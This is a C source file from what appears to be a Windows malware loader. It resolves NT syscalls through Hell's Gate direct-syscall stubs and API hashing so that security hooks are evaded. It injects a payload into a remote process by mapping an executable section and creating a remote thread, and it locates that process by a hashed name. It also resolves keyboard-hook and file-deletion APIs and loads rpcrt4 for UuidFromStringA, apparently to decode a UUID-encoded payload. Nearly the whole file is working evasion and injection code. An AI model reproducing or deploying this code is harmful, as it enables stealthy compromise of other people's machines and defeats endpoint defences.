#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#include "Psapi.h"

#pragma comment (lib, "psapi.lib")

/*-------------------------------------------------
 Global Syscall and Api Tables
---------------------------------------------------*/
VX_TABLE	g_Sys = { 0 };
API_HASHING g_Api = { 0 };

/*-------------------------------------------------
 Initialize Syscalls Function
---------------------------------------------------*/
BOOL InitializeSyscalls() {

#ifdef DEBUG
	PRINTA("[*] Starting InitializeSyscalls...\n");
#endif

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	if (!pCurrentTeb)
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] TEB obtained: 0x%p\n", pCurrentTeb);
#endif

	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] PEB obtained: 0x%p\n", pCurrentPeb);
	PRINTA("[+] OS Version: %d.%d (Build %d)\n", pCurrentPeb->OSMajorVersion, pCurrentPeb->OSMinorVersion, pCurrentPeb->OSBuildNumber);
#endif

#ifdef DEBUG
	PRINTA("[*] Getting NTDLL base address...\n");
#endif
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
#ifdef DEBUG
	PRINTA("[+] NTDLL Base: 0x%p\n", pLdr->DllBase);
	PRINTA("[+] NTDLL Name: %wZ\n", &pLdr->BaseDllName);
#endif

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdr->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] Export Directory obtained: 0x%p\n", pImageExportDirectory);
	PRINTA("[+] Number of exported functions: %d\n", pImageExportDirectory->NumberOfFunctions);
#endif

#ifdef DEBUG
	PRINTA("\n[*] Initializing syscall hashes...\n");
#endif
	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtOpenSection.uHash = NtOpenSection_JOAA;
#ifdef DEBUG
	PRINTA("[+] Syscall hashes initialized\n");
#endif

#ifdef DEBUG
	PRINTA("\n[*] Resolving syscalls...\n");
	PRINTA("[*] Resolving NtCreateSection (Hash: 0x%0.8X)...\n", g_Sys.NtCreateSection.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtCreateSection -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtCreateSection.wSystemCall, g_Sys.NtCreateSection.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtMapViewOfSection (Hash: 0x%0.8X)...\n", g_Sys.NtMapViewOfSection.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtMapViewOfSection -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtMapViewOfSection.wSystemCall, g_Sys.NtMapViewOfSection.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtUnmapViewOfSection (Hash: 0x%0.8X)...\n", g_Sys.NtUnmapViewOfSection.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtUnmapViewOfSection -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtUnmapViewOfSection.wSystemCall, g_Sys.NtUnmapViewOfSection.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtClose (Hash: 0x%0.8X)...\n", g_Sys.NtClose.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtClose -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtClose.wSystemCall, g_Sys.NtClose.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtCreateThreadEx (Hash: 0x%0.8X)...\n", g_Sys.NtCreateThreadEx.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtCreateThreadEx -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtCreateThreadEx.wSystemCall, g_Sys.NtCreateThreadEx.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtWaitForSingleObject (Hash: 0x%0.8X)...\n", g_Sys.NtWaitForSingleObject.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtWaitForSingleObject -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtWaitForSingleObject.wSystemCall, g_Sys.NtWaitForSingleObject.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtDelayExecution (Hash: 0x%0.8X)...\n", g_Sys.NtDelayExecution.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtDelayExecution -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtDelayExecution.wSystemCall, g_Sys.NtDelayExecution.pAddress);
#endif

#ifdef DEBUG
	PRINTA("[*] Resolving NtQuerySystemInformation (Hash: 0x%0.8X)...\n", g_Sys.NtQuerySystemInformation.uHash);
#endif
	if (!GetVxTableEntry(pLdr->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
#ifdef DEBUG
	PRINTA("[+] NtQuerySystemInformation -> SSN: 0x%0.4X, Address: 0x%p\n", g_Sys.NtQuerySystemInformation.wSystemCall, g_Sys.NtQuerySystemInformation.pAddress);
#endif

	// User32.dll Exported Functions
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	// Kernel32.dll Exported Functions
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);
	g_Api.pMapViewOfFile = (fnMapViewOfFile)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), MapViewOfFile_JOAA);
	g_Api.pVirtualProtect = (fnVirtualProtect)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualProtect_JOAA);
	g_Api.pLoadLibraryW	= (fnLoadLibraryW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), LoadLibraryW_JOAA);
	if (g_Api.pOpenProcess == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pSetFileInformationByHandle == NULL || g_Api.pMapViewOfFile == NULL || g_Api.pVirtualProtect == NULL || g_Api.pLoadLibraryW == NULL)
		return FALSE;
	
	// Used to load rpcrt4.dll
	g_Api.pLoadLibraryW(L"rpcrt4.dll");

	// Rpcrt4.dll Exported Function
	g_Api.pUuidFromStringA = (fnUuidFromStringA)GetProcAddressH(GetModuleHandleH(RPCRT4DLL_JOAA), UuidFromStringA_JOAA);

	if (g_Api.pUuidFromStringA == NULL)
		return FALSE;

	return TRUE;
}

/*-------------------------------------------------
 Remote Mapping Injection Function
---------------------------------------------------*/
BOOL RemoteMapInject(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE						hSection					= NULL;
	HANDLE						hThread						= NULL;
	PVOID						pLocalAddress				= NULL,
								pRemoteAddress				= NULL;
	NTSTATUS					STATUS						= NULL;
	SIZE_T						sViewSize					= 0;
	LARGE_INTEGER				MaxSize						= {
														.HighPart = 0,
														.LowPart = sPayloadSize
	};

	HellsGate(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		HellsGate(g_Sys.NtClose.wSystemCall);
		HellDescent(hSection);
		return FALSE;
	}

	_memcpy(pLocalAddress, pPayload, sPayloadSize);

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtMapViewOfSection[2] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
		HellDescent((HANDLE)-1, pLocalAddress);
		HellsGate(g_Sys.NtClose.wSystemCall);
		HellDescent(hSection);
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Section mapped to remote process at: 0x%p \n", pRemoteAddress);
#endif

	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
		HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
		HellDescent((HANDLE)-1, pLocalAddress);
		HellsGate(g_Sys.NtClose.wSystemCall);
		HellDescent(hSection);
		return FALSE;
	}

#ifdef DEBUG
	PRINTA("[+] Remote thread created successfully \n");
#endif

	
	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
	}


	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
#ifdef DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
	}

	
	if (hThread) {
		HellsGate(g_Sys.NtClose.wSystemCall);
		HellDescent(hThread);
	}

	if (hSection) {
		HellsGate(g_Sys.NtClose.wSystemCall);
		HellDescent(hSection);
	}

#ifdef DEBUG
	PRINTA("[+] Injection completed successfully \n");
#endif

	return TRUE;
}

/*-------------------------------------------------
 Process Enumeration Via NtQueryInformationProcess
---------------------------------------------------*/
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* Pid, IN HANDLE* hProcess) {

	ULONG							uReturnLen1					= NULL,
									uReturnLen2					= NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemInfo					= NULL;
	PVOID							pTmpValue					= NULL;
	NTSTATUS						STATUS						= NULL;

	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemInfo == NULL) return FALSE;

	pTmpValue = SystemInfo;

	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation[2] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		HeapFree(GetProcessHeap(), 0, pTmpValue);
		return FALSE;
	}

	while (TRUE) {

		if (SystemInfo->ImageName.Length && HASHW(SystemInfo->ImageName.Buffer) == HASHW(szProcName)) {
			*Pid = (DWORD)SystemInfo->UniqueProcessId;
			*hProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(ULONG_PTR)SystemInfo->UniqueProcessId);
			break;
		}

		if (!SystemInfo->NextEntryOffset)
			break;

		SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemInfo + SystemInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pTmpValue);

	if (*Pid == NULL || *hProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
